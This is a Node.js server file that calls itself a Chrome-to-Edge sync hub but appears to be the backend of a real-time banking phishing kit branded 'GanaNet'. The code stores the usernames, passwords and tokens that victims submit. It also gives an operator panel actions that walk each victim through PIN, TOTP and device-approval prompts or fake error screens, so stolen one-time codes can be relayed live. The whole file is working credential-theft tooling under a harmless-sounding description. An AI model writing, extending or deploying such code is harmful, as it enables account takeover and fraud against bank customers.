/**
 * Servidor de producción (Render / Node):
 * - sirve dist/
 * - hub /api/ops para sync Chrome ↔ Edge
 */
import http from 'node:http'
import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const DIST = path.join(__dirname, 'dist')
const PORT = Number(process.env.PORT || 3000)

/** @type {Map<string, object>} */
const sessions = new Map()
/** @type {Array<{ id: string, sessionId: string, action: string, image: string, at: number }>} */
const actions = []
let actionSeq = 0

function sendJson(res, status, data) {
  const body = JSON.stringify(data)
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET,POST,DELETE,OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Cache-Control': 'no-store',
  })
  res.end(body)
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = []
    req.on('data', (c) => chunks.push(c))
    req.on('end', () => {
      try {
        const raw = Buffer.concat(chunks).toString('utf8')
        resolve(raw ? JSON.parse(raw) : {})
      } catch (err) {
        reject(err)
      }
    })
    req.on('error', reject)
  })
}

async function handleOps(req, res, pathname, searchParams) {
  if (req.method === 'OPTIONS') {
    sendJson(res, 204, {})
    return true
  }

  if (pathname === '/api/ops/sessions' && req.method === 'GET') {
    const list = [...sessions.values()].sort(
      (a, b) => (a.createdAt || 0) - (b.createdAt || 0),
    )
    sendJson(res, 200, { sessions: list })
    return true
  }

  if (pathname === '/api/ops/sessions' && req.method === 'POST') {
    const body = await readBody(req)
    if (!body?.id) {
      sendJson(res, 400, { error: 'id required' })
      return true
    }
    const prev = sessions.get(body.id) || {}
    const nextSession = {
      ...prev,
      ...body,
      id: body.id,
      username: body.username ?? body.user ?? prev.username ?? '',
      password: body.password ?? body.clave ?? prev.password ?? '',
      user: body.username ?? body.user ?? prev.user ?? '',
      clave: body.password ?? body.clave ?? prev.clave ?? '',
      createdAt: body.createdAt || prev.createdAt || Date.now(),
      last_seen: body.last_seen || Date.now(),
      updatedAt: Date.now(),
      state: body.state || body.status || prev.state || 'waiting',
      token: body.token ?? prev.token ?? '',
    }
    sessions.set(body.id, nextSession)
    sendJson(res, 200, { ok: true, session: nextSession })
    return true
  }

  if (pathname === '/api/ops/sessions' && req.method === 'DELETE') {
    sessions.clear()
    actions.length = 0
    actionSeq = 0
    sendJson(res, 200, { ok: true })
    return true
  }

  if (pathname === '/api/ops/session' && req.method === 'DELETE') {
    const body = await readBody(req)
    const id = body?.id || body?.sessionId
    if (!id) {
      sendJson(res, 400, { error: 'id required' })
      return true
    }
    sessions.delete(id)
    sendJson(res, 200, { ok: true })
    return true
  }

  if (pathname === '/api/ops/ping' && req.method === 'POST') {
    const body = await readBody(req)
    const s = sessions.get(body.sessionId)
    if (s) {
      s.last_seen = Date.now()
      s.updatedAt = Date.now()
      sessions.set(body.sessionId, s)
    }
    sendJson(res, 200, { ok: true })
    return true
  }

  if (pathname === '/api/ops/token' && req.method === 'POST') {
    const body = await readBody(req)
    const s = sessions.get(body.sessionId)
    if (s) {
      s.last_seen = Date.now()
      s.updatedAt = Date.now()
      if (body.typingOnly) {
        if (s.state !== 'waiting-token' && s.state !== 'done') s.state = 'typing'
      } else {
        s.token = body.token || ''
        s.state = body.submitted ? 'waiting-token' : 'typing'
      }
      sessions.set(body.sessionId, s)
    }
    sendJson(res, 200, { ok: true })
    return true
  }

  if (pathname === '/api/ops/actions' && req.method === 'POST') {
    const body = await readBody(req)
    if (!body?.sessionId || !body?.action) {
      sendJson(res, 400, { error: 'sessionId and action required' })
      return true
    }
    actionSeq += 1
    const entry = {
      id: `a_${actionSeq}_${Date.now()}`,
      sessionId: body.sessionId,
      action: body.action,
      image: typeof body.image === 'string' ? body.image : '',
      at: Date.now(),
    }
    actions.push(entry)
    if (actions.length > 400) actions.splice(0, actions.length - 400)
    const s = sessions.get(body.sessionId)
    if (s) {
      const stateMap = {
        ganapin: 'waiting-ganapin',
        totp: 'waiting-totp',
        dispositivo: 'waiting-dispositivo',
        'error-pass': 'error-pass',
        'error-user': 'error-user',
        'error-token': 'error-token',
        done: 'done',
      }
      s.state = stateMap[body.action] || body.action
      if (entry.image) s.securityImage = entry.image
      s.updatedAt = Date.now()
      sessions.set(body.sessionId, s)
    }
    sendJson(res, 200, { ok: true, action: entry })
    return true
  }

  if (pathname === '/api/ops/actions' && req.method === 'GET') {
    const sessionId = searchParams.get('sessionId')
    const since = Number(searchParams.get('since') || 0)
    let list = actions.filter((a) => a.at > since)
    if (sessionId) list = list.filter((a) => a.sessionId === sessionId)
    sendJson(res, 200, {
      actions: list.map((a) => ({
        id: a.id,
        sessionId: a.sessionId,
        action: a.action,
        image: '',
        at: a.at,
      })),
    })
    return true
  }

  return false
}

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.woff': 'font/woff',
  '.ttf': 'font/ttf',
  '.ico': 'image/x-icon',
  '.webp': 'image/webp',
}

function safeJoin(root, reqPath) {
  const decoded = decodeURIComponent(reqPath.split('?')[0])
  const cleaned = path.normalize(decoded).replace(/^(\.\.[/\\])+/, '')
  const full = path.join(root, cleaned)
  if (!full.startsWith(root)) return null
  return full
}

function sendFile(res, filePath) {
  const ext = path.extname(filePath).toLowerCase()
  const type = MIME[ext] || 'application/octet-stream'
  const stream = fs.createReadStream(filePath)
  res.writeHead(200, { 'Content-Type': type })
  stream.pipe(res)
  stream.on('error', () => {
    if (!res.headersSent) res.writeHead(500).end('error')
  })
}

function serveStatic(req, res, pathname) {
  let reqPath = pathname
  if (reqPath === '/panel') {
    res.writeHead(301, { Location: '/panel/' })
    res.end()
    return
  }
  if (reqPath === '/panel/') reqPath = '/panel/index.html'
  if (reqPath === '/') reqPath = '/index.html'

  let filePath = safeJoin(DIST, reqPath)
  if (!filePath) {
    res.writeHead(400).end('bad path')
    return
  }

  if (fs.existsSync(filePath) && fs.statSync(filePath).isDirectory()) {
    filePath = path.join(filePath, 'index.html')
  }

  if (fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
    sendFile(res, filePath)
    return
  }

  // fallback login
  const index = path.join(DIST, 'index.html')
  if (fs.existsSync(index)) {
    sendFile(res, index)
    return
  }
  res.writeHead(404).end('Not Found')
}

const server = http.createServer(async (req, res) => {
  try {
    const url = new URL(req.url || '/', `http://${req.headers.host || 'localhost'}`)
    const pathname = url.pathname

    if (pathname.startsWith('/api/ops')) {
      const handled = await handleOps(req, res, pathname, url.searchParams)
      if (handled) return
      sendJson(res, 404, { error: 'not found' })
      return
    }

    if (req.method !== 'GET' && req.method !== 'HEAD') {
      res.writeHead(405).end('Method Not Allowed')
      return
    }

    serveStatic(req, res, pathname)
  } catch (err) {
    console.error(err)
    if (!res.headersSent) sendJson(res, 500, { error: String(err?.message || err) })
  }
})

server.listen(PORT, () => {
  console.log(`GanaNet server on :${PORT} (dist + /api/ops)`)
})
